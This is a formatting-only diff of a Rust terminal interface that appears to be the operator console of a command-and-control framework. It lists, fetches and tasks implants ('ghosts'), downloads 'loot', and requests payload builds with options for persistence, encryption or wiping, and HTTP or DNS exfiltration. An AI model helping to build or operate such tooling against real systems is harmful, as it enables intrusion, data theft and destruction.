@@ -2,18 +2,18 @@ use charon::action::Action;
 use charon::client::{C2Client, RealClient};
 use charon::models::GhostBuildRequest;
 use charon::state::AppState;
-use charon::update::{self, Command};
 use charon::ui;
+use charon::update::{self, Command};
 
 use crossterm::{
     event::{self, DisableMouseCapture, EnableMouseCapture, Event as CEvent, KeyCode},
     execute,
-    terminal::{disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen}
+    terminal::{EnterAlternateScreen, LeaveAlternateScreen, disable_raw_mode, enable_raw_mode},
 };
-use ratatui::{backend::CrosstermBackend, Terminal};
+use ratatui::{Terminal, backend::CrosstermBackend};
+use std::error::Error;
 use std::io;
 use std::sync::Arc;
-use std::error::Error;
 use std::time::{Duration, Instant};
 use tokio::sync::mpsc;
 
@@ -53,7 +53,7 @@ async fn main() -> Result<(), Box<dyn Error>> {
                     KeyCode::Right => Action::Right,
                     KeyCode::Tab => Action::NextTab,
                     KeyCode::BackTab => Action::PrevTab,
-                    _ => Action::Tick
+                    _ => Action::Tick,
                 };
 
                 if let Some(command) = update::update(&mut app, action) {
@@ -90,7 +90,7 @@ async fn process_command(cmd: Command, client: Arc<RealClient>, tx: mpsc::Sender
                 let res = c.fetch_ghosts().await;
                 let _ = t.send(Action::ReceiveGhosts(res)).await;
             });
-        },
+        }
         Command::FetchTasks(ghost_id) => {
             let c = client.clone();
             let t = tx.clone();
@@ -98,7 +98,7 @@ async fn process_command(cmd: Command, client: Arc<RealClient>, tx: mpsc::Sender
                 let res = c.fetch_tasks(&ghost_id).await;
                 let _ = t.send(Action::ReceiveTasks(res)).await;
             });
-        },
+        }
         Command::SendTask { ghost_id, req } => {
             let c = client.clone();
             let t = tx.clone();
@@ -106,7 +106,7 @@ async fn process_command(cmd: Command, client: Arc<RealClient>, tx: mpsc::Sender
                 let res = c.send_task(&ghost_id, req).await;
                 let _ = t.send(Action::ReceiveTaskSendResult(res)).await;
             });
-        },
+        }
         Command::UpdateGhostConfig { ghost_id, config } => {
             let c = client.clone();
             let t = tx.clone();
@@ -114,7 +114,7 @@ async fn process_command(cmd: Command, client: Arc<RealClient>, tx: mpsc::Sender
                 let res = c.update_config(&ghost_id, config).await;
                 let _ = t.send(Action::ReceiveConfigUpdateResult(res)).await;
             });
-        },
+        }
         Command::KillGhost(ghost_id) => {
             let c = client.clone();
             let t = tx.clone();
@@ -122,12 +122,24 @@ async fn process_command(cmd: Command, client: Arc<RealClient>, tx: mpsc::Sender
                 let res = c.kill_ghost(&ghost_id).await;
                 let _ = t.send(Action::ReceiveKillResult(res)).await;
             });
-        },
+        }
         Command::BuildPayload {
-            url, port, debug, scenario_mode,
-            persistence, persist_runcontrol, persist_service, persist_cron,
-            impact, impact_level, impact_encrypt, encryption_algo, impact_wipe,
-            exfil, exfil_http, exfil_dns
+            url,
+            port,
+            debug,
+            scenario_mode,
+            persistence,
+            persist_runcontrol,
+            persist_service,
+            persist_cron,
+            impact,
+            impact_level,
+            impact_encrypt,
+            encryption_algo,
+            impact_wipe,
+            exfil,
+            exfil_http,
+            exfil_dns,
         } => {
             let c = client.clone();
             let t = tx.clone();
@@ -150,14 +162,14 @@ async fn process_command(cmd: Command, client: Arc<RealClient>, tx: mpsc::Sender
                 impact_wipe,
                 enable_exfil: exfil,
                 exfil_http,
-                exfil_dns
+                exfil_dns,
             };
 
             tokio::spawn(async move {
                 let res = c.request_build(req).await;
                 let _ = t.send(Action::ReceiveBuildResult(res)).await;
             });
-        },
+        }
         Command::FetchLootList => {
             let client = client.clone();
             let tx = tx.clone();
@@ -165,15 +177,17 @@ async fn process_command(cmd: Command, client: Arc<RealClient>, tx: mpsc::Sender
                 let res = client.fetch_loot_list().await;
                 tx.send(Action::ReceiveLootList(res)).await.unwrap_or(());
             });
-        },
+        }
         Command::DownloadLoot(filename, dest) => {
             let client = client.clone();
             let tx = tx.clone();
             tokio::spawn(async move {
                 let res = client.download_loot(&filename, &dest).await;
-                tx.send(Action::ReceiveLootDownload(res)).await.unwrap_or(());
+                tx.send(Action::ReceiveLootDownload(res))
+                    .await
+                    .unwrap_or(());
             });
-        },
+        }
         Command::Quit => {
             let _ = disable_raw_mode();
             let _ = execute!(io::stdout(), LeaveAlternateScreen, DisableMouseCapture);
